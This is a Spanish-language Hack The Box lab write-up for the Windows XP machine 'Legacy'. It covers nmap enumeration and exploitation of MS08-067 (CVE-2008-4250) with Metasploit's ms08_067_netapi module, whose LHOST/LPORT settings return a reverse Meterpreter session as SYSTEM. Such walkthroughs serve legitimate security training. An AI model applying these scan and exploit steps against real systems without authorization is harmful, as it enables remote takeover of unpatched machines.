
> [!info] 📋 Información de la Máquina
> **🖥️ OS:** Windows
> **🎯 IP:** 10.129.11.4
> **💀 Dificultad:** Fácil
> **🌐 Plataforma:** Hack The Box
> **📅 Fecha:** 04-03-2026
> **✅ Pwned:** 🟢 Sí

---

## 🔍 Reconocimiento y Enumeración

Antes de comenzar con la enumeración, lanzamos un ping para verificar conectividad con la máquina objetivo. Además del simple echo reply, aprovecharemos el valor del **TTL** para intuir el sistema operativo: un TTL cercano a **128** indica Windows, mientras que uno cercano a **64** apunta a Linux.

> [!tip] Verificación de conectividad y detección de OS por TTL
> ```python
> ping -c 1 10.129.11.4
> ```
>
> `-c 1` — Envía **un único paquete ICMP** y termina, en lugar de pingear indefinidamente.
> `10.129.11.4` — **IP objetivo** a la que se lanza el ping.

![](/assets/Legacy-img-04-03-2026.png)

Como se puede observar en el output, obtenemos respuesta con un TTL de **127**, lo que nos indica que estamos ante una máquina **Windows**. Confirmada la conectividad, procedemos con la enumeración.

### 👁️ Enumeración con NMAP

#### Enumeración de puertos

Comenzamos la fase de enumeración identificando qué puertos se encuentran abiertos en la máquina objetivo. Para ello utilizamos nmap en su modalidad de SYN Scan, que nos permite realizar un escaneo rápido y sigiloso sobre el rango completo de puertos sin completar el three-way handshake.

> [!tip] Escaneo de puertos completo y sigiloso
> ```python
> nmap -sS -p- 10.129.11.4 --open --min-rate 5000 -vvv -n -Pn -oN ports
> ```
>
> `-sS` — **SYN Scan** (half-open). Envía paquetes SYN sin completar el three-way handshake. Sigiloso y rápido, requiere root.
> `-p-` — Escanea los **65535 puertos** posibles.
> `10.129.11.4` — **IP objetivo** del escaneo.
> `--open` — Muestra **únicamente los puertos abiertos**, filtrando cerrados y filtrados.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo**.
> `-vvv` — **Triple verbose**, muestra información en tiempo real mientras escanea.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo, asume el host activo.
> `-oN ports` — Guarda el output en formato normal en un archivo llamado `ports`.

![](/assets/Legacy-img-04-03-2026-1.png)

Los puertos abiertos identificados son **135, 139 y 445**, todos relacionados con servicios **RPC y SMB**, lo que ya orienta la superficie de ataque hacia protocolos de red Windows.

---

#### Enumeración de versiones y servicios

Con los puertos abiertos identificados, lanzamos nmap con detección de versiones y scripts por defecto para determinar exactamente qué servicios y versiones están expuestos.

> [!tip] Detección de versiones y scripts sobre puertos seleccionados
> ```python
> nmap -sCV -p135,139,445 --min-rate 5000 -vvv -n -Pn -oN version 10.129.11.4
> ```
>
> `-sCV` — Combina **-sC** (scripts por defecto) y **-sV** (detección de versiones y servicios).
> `-p135,139,445` — Escanea **únicamente los puertos encontrados** en el escaneo anterior.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo**.
> `-vvv` — **Triple verbose**, muestra información en tiempo real mientras escanea.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo, asume el host activo.
> `-oN version` — Guarda el output en formato normal en un archivo llamado `version`.
> `10.129.11.4` — **IP objetivo** del escaneo.

![](/assets/Legacy-img-04-03-2026-2.png)

---

#### Enumeración de posibles vulnerabilidades

Con los servicios identificados, procedemos a lanzar los scripts de la categoría `vuln` de nmap para detectar vulnerabilidades conocidas de forma automática sobre los puertos descubiertos.

> [!tip] Detección automática de vulnerabilidades con scripts NSE
> ```python
> nmap --script vuln -p135,139,445 --min-rate 5000 -n -Pn -vvv -oN vuln 10.129.11.4
> ```
>
> `--script vuln` — Lanza la categoría de scripts **vuln** del motor NSE, que comprueba vulnerabilidades conocidas en los servicios detectados.
> `-p135,139,445` — Apunta únicamente a los **puertos ya identificados** anteriormente.
> `10.129.11.4` — **IP objetivo** del escaneo.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo, asume el host activo.
> `-vvv` — **Triple verbose**, muestra información en tiempo real mientras escanea.
> `-oN vuln` — Guarda el output en formato normal en un archivo llamado `vuln`.

![](/assets/Legacy-img-04-03-2026-3.png)

El escaneo revela dos vulnerabilidades críticas en el puerto **445**: **MS17-010** y **MS08-067**. Ambas permiten ejecución remota de código sin autenticación sobre SMB. Optamos por explotar **MS08-067**, ya que el sistema objetivo es Windows XP, plataforma para la que este exploit fue originalmente diseñado y tiene una tasa de éxito muy alta.

---

## 💥 Explotación

> [!info] MS08-067 — CVE-2008-4250
> Fallo crítico en el servicio **Server Service** de Windows que gestiona solicitudes RPC sobre SMB. Un atacante puede enviar una petición RPC malformada de forma **no autenticada** y conseguir ejecución remota de código directamente como **SYSTEM**, sin necesidad de credenciales ni interacción del usuario.
>
> La vulnerabilidad reside en la función `NetPathCanonicalize`, que no valida correctamente las rutas de red, desencadenando un **buffer overflow** remoto.
>
> **CVE:** CVE-2008-4250 | **CVSS:** 10.0 (Crítico)
> **Afecta:** Windows XP, Windows 2000, Windows Server 2003
> **Vector:** Red → Puerto 445 (SMB) / 139 (NetBIOS) | **Auth requerida:** Ninguna
> **Módulo Metasploit:** `exploit/windows/smb/ms08_067_netapi`

Iniciamos Metasploit con su base de datos activa y buscamos el módulo correspondiente a la vulnerabilidad:

> [!tip] Iniciar Metasploit y buscar el módulo MS08-067
> ```python
> sudo service postgresql start
> sudo msfdb init
> sudo msfconsole
> search ms08-067
> ```
>
> `sudo service postgresql start` — Arranca el servicio **PostgreSQL** que usa Metasploit para almacenar sesiones y resultados.
> `sudo msfdb init` — Inicializa la base de datos de Metasploit.
> `sudo msfconsole` — Lanza la **consola interactiva** de Metasploit.
> `search ms08-067` — Busca en la base de datos de Metasploit el módulo asociado a la vulnerabilidad.

![](/assets/Legacy-img-04-03-2026-4.png)

Seleccionamos el módulo con `use 0`, revisamos los parámetros con `options` y configuramos los valores necesarios:

> [!tip] Configurar y ejecutar el exploit MS08-067
> ```python
> use 0
> options
> set RHOSTS 10.129.11.4
> set LHOST 10.10.16.198
> set LPORT 443
> run
> ```
>
> `use 0` — Carga el módulo `exploit/windows/smb/ms08_067_netapi`.
> `options` — Muestra los **parámetros requeridos** antes de ejecutar el módulo.
> `set RHOSTS` — Define la **IP de la máquina víctima**.
> `set LHOST` — Define la **IP del túnel VPN** de nuestra máquina atacante.
> `set LPORT` — Establece el **puerto local** en escucha para recibir la sesión.
> `run` — Ejecuta el exploit contra el objetivo.

![](/assets/Legacy-img-04-03-2026-5.png)

El exploit completa con éxito y obtenemos una sesión de **Meterpreter** directamente como `NT AUTHORITY\SYSTEM`, el nivel de privilegio más alto en Windows. No es necesaria ninguna escalada de privilegios. Ejecutamos `shell` para operar desde una shell nativa y navegamos a los directorios de los usuarios para recuperar las flags.

---

## 🔼 Escalada de Privilegios

El acceso inicial obtenido mediante MS08-067 ya otorga privilegios de **SYSTEM** directamente, por lo que no es necesaria ninguna técnica de escalada adicional. La máquina queda completamente comprometida desde el primer shell.

---

## 🏁 Flags

| Flag | Hash |
|------|------|
| 🧑 User | `...` |
| 👑 Root | `...` |

---

## 📝 Lecciones Aprendidas

> [!tip] Takeaways
> Legacy es un ejemplo clásico de lo que ocurre cuando un sistema no recibe actualizaciones de seguridad: dos vulnerabilidades críticas con CVSS 10.0 expuestas directamente en la red, sin necesidad de credenciales ni interacción del usuario. El aprendizaje principal es entender el **flujo de decisión ante múltiples CVEs**: cuando el escaneo devuelve MS17-010 y MS08-067 simultáneamente, hay que analizar el contexto del sistema operativo para elegir el vector más adecuado. En un Windows XP, MS08-067 is la apuesta más sólida. Por último, esta máquina refuerza la importancia de dominar **Metasploit como plataforma**, especialmente la correcta configuración del `LHOST` con la IP del túnel VPN, un detalle que marca la diferencia entre obtener sesión o no.